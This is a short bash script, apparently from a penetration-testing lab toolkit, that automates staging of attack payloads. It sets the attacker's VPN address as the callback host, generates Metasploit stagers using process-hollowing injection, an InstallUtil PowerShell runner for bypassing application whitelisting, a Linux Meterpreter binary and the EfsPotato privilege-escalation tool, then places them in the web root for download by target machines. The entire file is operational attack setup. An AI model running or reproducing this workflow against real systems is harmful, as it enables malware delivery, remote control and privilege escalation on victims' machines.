#!/bin/bash
set -ex
IP=`ifconfig tun0 | grep "inet "|awk '{print $2}'`
echo "Updating IP to $IP"
sed -i 's/^LHOST.*/LHOST="'"$IP"'"/' ak.py

python3 generate_win_msf_stager.py --injection hollow --format exe
python3 generate_win_msf_stager.py --injection hollow --format dll
python3 generate_win_installutil_ps_runner.py
python3 generate_msf_linux_exe.py
python3 generate_win_util_EfsPotato.py

sudo mv win_msf_stager.dll /var/www/html/met.dll
sudo mv win_msf_stager.exe /var/www/html/met.exe
sudo mv win_installutil_ps_runner.txt /var/www/html/Bypass.txt
sudo mv msf-linux-x64 /var/www/html/
sudo mv win_efspotato.exe /var/www/html/EfsPotato.exe
